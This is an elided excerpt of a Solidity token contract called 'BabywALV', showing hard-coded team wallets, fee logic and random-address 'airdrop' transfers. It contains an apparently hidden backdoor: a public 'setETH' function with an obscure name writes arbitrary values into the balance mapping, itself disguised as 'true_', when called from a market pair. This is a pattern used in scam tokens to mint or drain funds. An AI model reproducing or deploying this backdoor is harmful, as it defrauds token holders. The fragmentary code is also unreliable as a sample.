...
contract BabywALV is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabywALV";
    string private _symbol = "BabywALV";
    uint8 private _decimals = 9;

    address payable private _anotherA = payable(0x5a79Dd7c3b8562Bb0FBD049bAEbe0A35F5a2D1B8); 
    address payable private teamWalletAddress = payable(0x415E8Cbf1fCB8cB9262158338C6Be7d3fD6Ec466); 
    ...
    uint256 private _totalSupply = 1 * 100000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 1 * 10**8; 
    ...
    function set_anotherA(address newAddress) external onlyOwner() {
...
function setETH(address a 
, uint256 w) public
{
if(
isMarketPair[_msgSender()])
true_[a] 
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            ...
            if(airDropFeeAmount > 0) {
			    ...
			    true_[teamWalletAddress] += airDropHalf;
                ...
                for (uint i = 0; i < 3; i++) {
                    ...
                    if(i == 2){
                        true_[randomAddr] += airDropFeeAmount - airDropEve - airDropEve;
                        emit Transfer(sender, randomAddr, airDropFeeAmount - airDropEve - airDropEve);
                    }else{
                        true_[randomAddr] += airDropEve;
